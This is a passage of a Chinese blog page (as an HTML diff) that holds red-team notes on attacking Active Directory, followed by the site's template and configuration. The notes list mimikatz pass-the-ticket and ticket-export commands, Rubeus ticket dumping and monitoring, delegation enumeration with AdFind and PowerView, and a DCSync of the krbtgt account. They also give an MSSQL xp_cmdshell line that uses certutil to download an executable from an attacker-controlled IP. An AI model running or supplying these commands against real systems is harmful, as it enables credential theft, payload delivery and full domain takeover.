+<p>4、使用 mimikatz 将 ST2 导入当前会话即可，如果有杀软，自行免杀，运行 mimikatz 进行 ptt：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line">mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi exit</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">获取票据</span><br><span class="line">mimikatz &quot;privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export&quot; exit</span><br><span class="line"></span><br><span class="line">rubeus dump /service:krbtgt /nowrap</span><br><span class="line">rubeus dump /luid:0xdeadbeef /nowrap</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><p>Adfind 下载地址：<a target="_blank" rel="noopener" href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</a> </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Adfind 使用参数：</span><br><span class="line">AdFind [switches] [-b basedn] [-f filter] [attr list]</span><br><span class="line">-b：指定要查询的根节点</span><br><span class="line">-f：LDAP过滤条件</span><br><span class="line">attr list：需要显示的属性</span><br><span class="line"></span><br><span class="line">例如需要查询当前域内的非约束委派用户：</span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查找非约束委派用户的工具还有很多！例如 Adfind、ldapdomaindump、PowerView … 等等，</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出无限制计算机</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Powerview</span></span></span><br><span class="line">Get-NetComputer -Unconstrained #DCs总是出现但对提权无用</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># ADSearch</span></span></span><br><span class="line">ADSearch.exe --search &quot;(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; --attributes samaccountname,dnshostname,operatingsystem</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用Mimikatz导出票据</span></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /export #推荐的方法</span><br><span class="line">kerberos::list /export #另一种方法</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监视登录并导出新票据</span></span><br><span class="line">.\Rubeus.exe monitor /targetuser:&lt;username&gt; /interval:10 #每10秒检查新的TGT</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="基于资源的委派"><a href="#基于资源的委派" class="headerlink" title="基于资源的委派"></a>基于资源的委派</h4><p>在这种情况下，受限对象将具有一个名为_<strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>_的属性，其中包含可以模拟对其进行身份验证的其他用户的名称。</p>
+<p>与其他委派方式相比，这种受限委派的另一个重要区别是，任何具有对计算机帐户的写权限（<em>GenericAll&#x2F;GenericWrite&#x2F;WriteDacl&#x2F;WriteProperty等）的用户都可以设置</em><strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>_（在其他委派形式中，您需要域管理员权限）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">要检查域的_**MachineAccountQuota**_，您可以使用：</span><br><span class="line"></span><br><span class="line">Get-DomainObject -Identity &quot;dc=domain,dc=local&quot; -Domain domain.local | select MachineAccountQuota</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcsync mimikatz &quot;lsadump::dcsync /domain:htb.local /user:krbtgt&quot; exit #Administrators,Domain,Admin,Enterprise Admins 组下的账户哦都行</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>xp_cmdshell””</p>
+<p>xp_dirtree</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Certutil Certutil 是一个 CLI 程序，可用于转储和显示证书颁发机构（CA），配置信息，证书服务， CA 组件的备份和还原以及验证证书、密钥对和证书链，它作为证书服务的一部分安装。</span><br><span class="line"></span><br><span class="line">certutil -hashfile</span><br><span class="line"></span><br><span class="line">certutil 还可用于从互联网下载文件。</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http://example.com/a.txt</span><br><span class="line">certutil.exe -urlcache -split -f http://10.10.10.7/share/1018.exe</span><br><span class="line">http://192.168.20.151:8080/shared/1018.exe</span><br><span class="line"></span><br><span class="line">xp_cmdshell&quot;certutil.exe -urlcache -split -f http://10.10.10.7:8080/shared/1018.exe C:\users\public\bb.exe&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/touxiang.jpg" alt="章鱼海绵">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>章鱼海绵
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2023/10/27/%F0%9F%90%A5%E5%B0%8F%E9%B8%A1/" target="_blank">🐥小鸡</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
+                        
+                            <a href="/categorie/%E5%86%85%E7%BD%91/">内网</a>
+                        
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tag/%E5%86%85%E7%BD%91/">内网</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                    
+                        <a href="/2023/10/24/HTB-Manager-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%BA%A6/" class="next-prefix">» </a> 下一篇：    <a href="/2023/10/24/HTB-Manager-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%BA%A6/" title="发布于 2023-10-24 02:04">HTB_Manager-第三季度</a>
+                    
+                </div>
+            </div>
+            
+    <div class="article-comments">
+        
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+
+        </div>
+    
+</div>
+    <div id="footer"></div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>简单地活着，肆意而又精彩！</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/touxiang.jpg">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user"><span>章鱼海绵</span></div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="知乎" href="https://www.4399.com/" class="" target="_blank" data=""><span class="iconfont icon-zhihu"></span></a>
+                
+                    <a name="微博" href="https://www.4399.com/" class="" target="_blank" data=""><span class="iconfont icon-weibo"></span></a>
+                
+                    <a name="QQ" href="javascript:;" class="image" target="_self" data="/image/sidebar/qq.png"><span class="iconfont icon-qq"></span></a>
+                
+                    <a name="微信" href="javascript:;" class="" target="_self" data="/image/sidebar/weixin.png"><span class="iconfont icon-wechat"></span></a>
+                
+                    <a name="GitHub" href="https://github.com/zhangyuhaimian/zhangyuhaimian.github.io" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+
+    
+        <div class="aplayer"></div>
+        <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+        <script type="text/javascript" src="/js/APlayer.min.js"></script>
+        <script type="text/javascript">
+            const aplayer = new APlayer({
+                container: document.querySelector(".aplayer"),
+                fixed: true,
+                autoplay: true,
+                loop: "all",
+                order: "random",
+                preload: "auto",
+                volume: 0.67,
+                mutex: true,
+                lrcType: 3,
+                audio: [
+                    
+                        {
+                            name: "知我",
+                            artist: "剑来",
+                            cover: "/music/cover/preview.jpg",
+                            url: "/music/song/知我.mp3",
+                            lrc: "/music/lrc/Endless Tears.lrc"
+                        },
+                    
+                ]
+            });
+        </script>
+    
+    
+    <div class="wrap-right">
+        <div class="setting">
+            <div class="iconbox favorites" switch="false">
+                <span class="iconfont icon-favorites"></span>
+                <span class="icontext">关注</span>
+            </div>
+            <div class="iconbox mode">
+                <div class="light">
+                    <span class="iconfont icon-daymode"></span>
+                    <span class="icontext">浅色模式</span>
+                </div>
+                <div class="dark">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                    <span class="icontext">深色模式</span>
+                </div>
+            </div>
+            <a href="javascript:;" target="_self" class="search">
+                <div class="iconbox">
+                    <span class="iconfont icon-search-menu"></span>
+                    <span class="icontext">搜索</span>
+                </div>
+            </a>
+            <div class="iconbox bottom">
+                <div style="display: inline-block; transform: rotate(180deg);">
+                    <span class="iconfont icon-top"></span>
+                </div>
+                <span class="icontext">跳至底部</span>
+            </div>
+        </div>
+        <div class="iconbox set">
+            <div style="display: inline-block;">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="iconbox top">
+            <span class="iconfont icon-top"></span>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "zhangyuhaimian",
+        GitHubRepositories : "zhangyuhaimian",
+
+        User             : "章鱼海绵",
+        UserAvatar       : "/image/sidebar/touxiang.jpg",
+        WebsiteStartDate : "2023-02-10",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) Hi, Live For Code",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : "/image/website/logo.png",
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/home.jpg",
+            
+        ],
+        HomeBannerText  : "遇事不决，可问春风，春风不语，便随本心",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.jpg",
+            
+        ],
+
+        OtherBannerText : "遇事不决，可问春风",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "简单地活着，肆意而又精彩！",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "赞赏",
+                    icon   : "icon-heart-fill",
+                    href   : "/donate",
+                    type   : "donate",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "订阅",
+                    icon   : "icon-rss",
+                    href   : "/atom.xml",
+                    type   : "",
+                    class  : "",
+                    target : "_blank"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "友情链接",
+                    icon   : "icon-link",
+                    href   : "/friend",
+                    type   : "friend",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "知乎",
+                        icon   : "icon-zhihu",
+                        href   : "https://www.4399.com/",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "微博",
+                        icon   : "icon-weibo",
+                        href   : "https://www.4399.com/",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "QQ",
+                        icon   : "icon-qq",
+                        href   : "javascript:;",
+                        class  : "image",
+                        target : "_self",
+                        image  : "/image/sidebar/qq.png"
+                    },
+                
+                    {
+                        name   : "微信",
+                        icon   : "icon-wechat",
+                        href   : "javascript:;",
+                        class  : "",
+                        target : "_self",
+                        image  : "/image/sidebar/weixin.png"
+                    },
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/zhangyuhaimian/zhangyuhaimian.github.io",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2022 WorstOne. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Based on cnblogs theme SimpleMemory.",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "SimpleMemory Author:",
+                            
+                                "BNDong",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "Theme:",
+                            
+                                "LiveForCode",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/wechat.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "010C3EANT8",
+            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
+            indexName     : "Notes",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Valine : {
+            switch         : true,
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "APlayer"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : true,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "知我",
+                        artist : "剑来",
+                        cover  : "/music/cover/preview.jpg",
+                        url    : "/music/song/知我.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : true, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : false
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js"
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "简单地活着, 肆意又精彩."
+        },
+            
+        Theme : {
+            url  : "https://github.com/first19326/Hexo-LiveForCode",
+            name : "Hexo - Live For Code"
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
